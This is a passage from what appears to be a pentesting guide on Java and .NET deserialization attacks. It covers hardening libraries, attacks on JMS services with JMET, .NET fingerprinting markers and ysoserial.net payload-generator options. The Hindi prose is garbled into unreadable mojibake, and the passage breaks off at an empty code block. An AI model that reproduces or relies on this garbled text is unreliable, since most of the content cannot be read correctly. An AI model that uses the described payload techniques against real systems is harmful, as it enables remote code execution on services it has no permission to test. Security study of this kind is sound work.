**рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣реНрдп рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ**: **NotSoSerial**, **jdeserialize**, рдФрд░ **Kryo** рдЬреИрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬрд╛рд╡рд╛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдФрд░ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрдирдд рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред рдпреЗ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдХреНрд▓рд╛рд╕реЛрдВ рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдпрд╛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░рдирд╛, рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдирд╛, рдФрд░ рдХрд╕реНрдЯрдо рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдирд╛ред

* **NotSoSerial** рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИред
* **jdeserialize** рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЙрдиреНрд╣реЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рд╛рдордЧреНрд░реА рдХреА рдкрд╣рдЪрд╛рди рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред
* **Kryo** рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ рдЧрддрд┐ рдФрд░ рдХреБрд╢рд▓рддрд╛ рдкрд░ рдЬреЛрд░ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╕рдВрджрд░реНрдн

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдФрд░ ysoserial рдЯреЙрдХ: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Gadgetinspector рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЯреЙрдХ: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec рдкреЗрдкрд░: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java рдФрд░ .Net JSON рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди **рдкреЗрдкрд░:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** рдЯреЙрдХ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

рдЬрд╛рдиреЗрдВ рдХрд┐ **JNDI Injection рдХреНрдпрд╛ рд╣реИ, рдЗрд╕реЗ RMI, CORBA рдФрд░ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ log4shell рдХреЛ рдХреИрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдФрд░ рдЗрд╕ рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг) рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}
## JMS - рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢ рд╕реЗрд╡рд╛

> **рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢ рд╕реЗрд╡рд╛** (**JMS**) API рджреЛ рдпрд╛ рджреЛ рд╕реЗ рдЕрдзрд┐рдХ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЗ рдмреАрдЪ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢-рдХреЗрдВрджреНрд░рд┐рдд рдорд┐рдбрд▓рд╡реЗрдпрд░ API рд╣реИред рдпрд╣ рдЙрддреНрдкрд╛рджрдХ-рдЙрдкрднреЛрдХреНрддрд╛ рд╕рдорд╕реНрдпрд╛ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдорд▓рдирд╛рдпрди рд╣реИред JMS рдЬрд╛рд╡рд╛ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо, рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдПрдбреАрд╢рди (рдЬрд╛рд╡рд╛ рдИрдИ) рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕рди рдорд╛рдЗрдХреНрд░реЛрд╕рд┐рд╕реНрдЯрдореНрд╕ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдЬрд╛рд╡рд╛ рд╕рдореБрджрд╛рдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдиреЗ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдХрд┐рдпрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╕рдВрджреЗрд╢рди рдорд╛рдирдХ рд╣реИ рдЬреЛ рдЬрд╛рд╡рд╛ рдИрдИ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдШрдЯрдХреЛрдВ рдХреЛ рд╕рдВрджреЗрд╢ рдмрдирд╛рдиреЗ, рднреЗрдЬрдиреЗ, рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╡рд┐рддрд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЛ рдвреАрд▓рд╛, рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдФрд░ рдЕрд╕рдордВрдЪрд┐рдд рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред (рд╕реНрд░реЛрдд: [рд╡рд┐рдХрд┐рдкреАрдбрд┐рдпрд╛](https://en.wikipedia.org/wiki/Java\_Message\_Service))ред

### рдЙрддреНрдкрд╛рдж

рдЗрд╕ рдорд┐рдбрд▓рд╡реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЙрддреНрдкрд╛рдж рд╣реИрдВ:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### рд╢реЛрд╖рдг

рдЗрд╕рд▓рд┐рдП, рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **рд╕рдореВрд╣ рд╕реЗрд╡рд╛рдПрдВ JMS рдХрд╛ рдЦрддрд░рдирд╛рдХ рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ (рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдкрдХреЛ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА) рддреЛ рдЖрдк **рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рд╡рд╛рд▓реЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рдзрд╛рд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдзрд╛рд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрд╛рд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрдкрднреЛрдХреНрддрд╛/рд╕рдмреНрд╕рдХреНрд░рд╛рдЗрдмрд░ рджреНрд╡рд╛рд░рд╛ рдЕрдирдзрд┐рдХреГрдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**ред\
рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЗрд╕ рд╢реЛрд╖рдг рдореЗрдВ рд╕рднреА **рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдЬреЛ рдЙрд╕ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ, рд╡реЗ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ**ред

рдЖрдкрдХреЛ рдпрд╛рдж рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдпрджрд┐ рдПрдХ рд╕реЗрд╡рд╛ рднреЗрджреНрдп рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдврдВрдЧ рд╕реЗ рдзрд╛рд░рдг рдХрд░ рд░рд╣рд╛ рд╣реИ) рддреЛ рднреА рдЖрдкрдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдЧреИрдЬреЗрдЯреНрд╕ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЙрдкрдХрд░рдг [JMET](https://github.com/matthiaskaiser/jmet) рдЗрд╕ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЖрдХреНрд░рдордг рдХрд░рдиреЗ рдФрд░ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬрд┐рд╕рдореЗрдВ рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдИ рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рд╡рд╛рд▓реЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ рдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпреЗ рджреБрд░реБрдкрдпреЛрдЧ рдЙрд╕ рд╕реЗрд╡рд╛ рдкрд░ рдХрд╛рдо рдХрд░реЗрдВрдЧреЗ рдЕрдЧрд░ рд╕реЗрд╡рд╛ рдЕрдм рднреА рднреЗрджреНрдп рд╣реИ рдФрд░ рдпрджрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдХрд┐рд╕реА рднреА рдЧреИрдЬреЗрдЯ рдореЗрдВ рднреЗрджреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рд╣реИред

### рд╕рдВрджрд░реНрдн

* JMET рдЯреЙрдХ: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рджреБрд░реБрдкрдпреЛрдЧ рдЙрд╕реА рддрд░рд╣ рд╕реЗ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдЬрд╛рд╡рд╛ рдореЗрдВ рдкрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╣реЛрддреА рд╣реИред
### рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ

#### WhiteBox

рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП рдЗрди рдШрдЯрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рд░реНрд╕ рдкрд░ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рдЕрдзреАрди рдПрдХ рдЪрд░ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд░ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

#### BlackBox

рдЦреЛрдЬ рдХреЛ рдЖрдзрд╛рд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП Base64 рдПрдиреНрдХреЛрдбреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ **AAEAAAD/////** рдпрд╛ рдХрд┐рд╕реА рднреА рд╕рдорд╛рди рдкреИрдЯрд░реНрди рдкрд░ рдЬреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкрд░ рдЧреБрдЬрд░ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рдХрд╛рд░ рдХреЗ рдЙрдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИ, **JSON** рдпрд╛ **XML** рд╕рдВрд░рдЪрдирд╛рдПрдБ рдЬрд┐рдирдореЗрдВ `TypeObject` рдпрд╛ `$type` рд╣реИрдВред

### ysoserial.net

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдЙрдкрдХрд░рдг [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЙрддреНрдкреАрдбрд╝рди рдмрдирд╛ рд╕рдХреЗрдВ**ред рдПрдХ рдмрд╛рд░ рдЬрдм рдЧрд┐рдЯ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛ рдЬрд╛рдП рддреЛ рдЖрдкрдХреЛ рдЙрдкрдХрд░рдг рдХреЛ **рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛** рдЪрд╛рд╣рд┐рдП, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╡рд┐рдЬрд╝реБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдЕрдЧрд░ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **рдХрд┐ ysoserial.net рдЕрдкрдирд╛ рдЙрддреНрдкреАрдбрд╝рди рдХреИрд╕реЗ рдмрдирд╛рддрд╛ рд╣реИ** рддреЛ рдЖрдк [**рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ ObjectDataProvider рдЧреИрдЬреЗрдЯ + ExpandedWrapper + Json.Net рдлреЙрд░реНрдореЗрдЯрд░**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ред

**ysoserial.net** рдХреЗ рдореБрдЦреНрдп рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ: **`--gadget`**, **`--formatter`**, **`--output`** рдФрд░ **`--plugin`**ред

* **`--gadget`** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЙрд╕ рдЧреИрдЬреЗрдЯ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЬрд┐рд╕реЗ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
* **`--formatter`**, рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЖрдкрдХреЛ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдкреЗрд▓реЛрдб рдХреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдЫреЗ рдХрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреМрди рд╕рд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)
* **`--output`** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЕрдЧрд░ рдЖрдк рдЙрддреНрдкреАрдбрд╝рди рдХреЛ **raw** рдпрд╛ **base64** рдПрдиреНрдХреЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред _рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **ysoserial.net** рдкреЗрд▓реЛрдб рдХреЛ **UTF-16LE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреЛрдб рдХрд░реЗрдЧрд╛ (рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд╣реИ) рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рд░реЙ рд▓реЗрддреЗ рд╣реИрдВ рдФрд░ рдмрд╕ рдЗрд╕реЗ рдПрдиреНрдХреЛрдб рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд╕рдВрдЧрддрддрд╛ рд╕рдорд╕реНрдпрд╛рдПрдВ** рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдЙрддреНрдкреАрдбрд╝рди рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХреЗрдЧреА (HTB JSON рдмреЙрдХреНрд╕ рдореЗрдВ рдкреЗрд▓реЛрдб UTF-16LE рдФрд░ ASCII рджреЛрдиреЛрдВ рдореЗрдВ рдХрд╛рдо рдХрд░ рдЧрдпрд╛ рдерд╛ рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рд╣рдореЗрд╢рд╛ рдХрд╛рдо рдХрд░реЗрдЧрд╛)ред_
* **`--plugin`** ysoserial.net рд╡рд┐рд╢реЗрд╖ рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП **рдЙрддреНрдкреАрдбрд╝рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд▓рдЧрдЗрди** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ ViewState

#### рдЕрдзрд┐рдХ ysoserial.net рдкреИрд░рд╛рдореАрдЯрд░

* `--minify` рдПрдХ **рдЫреЛрдЯрд╛ рдкреЗрд▓реЛрдб** рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ)
* `--raf -f Json.Net -c "рдХреБрдЫ рднреА"` рдпрд╣ рд╕рднреА рдЧреИрдЬреЗрдЯреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдЧрд╛ рдЬреЛ рдПрдХ рдкреНрд░рджрддреНрдд рдлреЙрд░реНрдореЗрдЯрд░ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (`Json.Net` рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ)
* `--sf xml` рдЖрдк рдПрдХ рдЧреИрдЬреЗрдЯ (`-g`) рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ ysoserial.net "xml" рд╢рдмреНрдж рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдЧрд╛ (рдорд╛рдорд▓реЗ рдХреА рдЕрдиреБрд╕рд╛рд░ рдорд╛рдорд▓реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ)

**ysoserial рдЙрджрд╛рд╣рд░рдг** рдЙрддреНрдкреАрдбрд╝рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
#Send ping
